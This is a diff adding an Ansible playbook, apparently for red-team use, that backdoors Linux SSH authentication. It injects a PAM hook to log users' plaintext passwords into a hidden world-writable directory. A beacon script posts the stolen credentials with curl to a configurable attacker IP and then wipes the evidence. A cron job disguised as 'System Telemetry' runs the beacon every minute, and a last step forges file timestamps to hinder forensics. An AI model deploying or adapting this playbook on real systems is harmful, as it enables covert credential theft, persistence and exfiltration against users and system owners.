@@ -1,0 +1,66 @@
+---
+# ===============================================================
+# CONFIGURATION: MANUAL ATTACKER IP
+# ===============================================================
+vars:
+  attacker_ip: "10.10.10.X"  # <--- SET YOUR RED WORKSTATION IP HERE
+  loot_dir: "/var/tmp/.system-cache"
+  loot_file: ".ssh_loot.txt"
+
+# --- STEP 1: PREPARATION ---
+- name: Setup Hidden Loot Directory
+  become: yes
+  file:
+    path: "{{ loot_dir }}"
+    state: directory
+    mode: '0777'
+
+# --- STEP 2: THE TRAP (PAM INTERCEPTION) ---
+- name: Deploy PAM Credential Logger
+  become: yes
+  copy:
+    dest: /usr/local/bin/ssh-auth-check
+    mode: '0755'
+    content: |
+      #!/bin/bash
+      # Intercepts passwords from PAM stdin
+      read -r password
+      echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $password" >> {{ loot_dir }}/{{ loot_file }}
+
+- name: Inject PAM Hook
+  become: yes
+  lineinfile:
+    path: /etc/pam.d/common-auth
+    insertbefore: BOF
+    line: "auth optional pam_exec.so expose_authtok /usr/local/bin/ssh-auth-check"
+
+# --- STEP 3: THE BEACON (AUTO-EXFILTRATION) ---
+- name: Deploy Auto-Exfiltration Beacon
+  become: yes
+  copy:
+    dest: /usr/local/bin/sshbeacon
+    mode: '0755'
+    content: |
+      #!/bin/bash
+      # Targets the manually set Attacker IP
+      ATTACKER_IP="{{ attacker_ip }}" 
+      LOOT="{{ loot_dir }}/{{ loot_file }}"
+
+      if [ -s "$LOOT" ]; then
+          # Send to your listener and wipe local file to stay quiet
+          curl -s -X POST -d "$(cat $LOOT)" http://$ATTACKER_IP:9999/incoming >/dev/null 2>&1
+          > "$LOOT"
+      fi
+
+# --- STEP 4: PERSISTENCE (CRON JOB) ---
+- name: Schedule Beacon (Every 1 Minute)
+  become: yes
+  cron:
+    name: "System Telemetry"
+    minute: "*"
+    job: "/usr/local/bin/sshbeacon >/dev/null 2>&1"
+
+# --- STEP 5: STEALTH (TIMESTAMP MATCHING) ---
+- name: Anti-Forensics Timestamp Match
+  become: yes
+  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/common-auth"
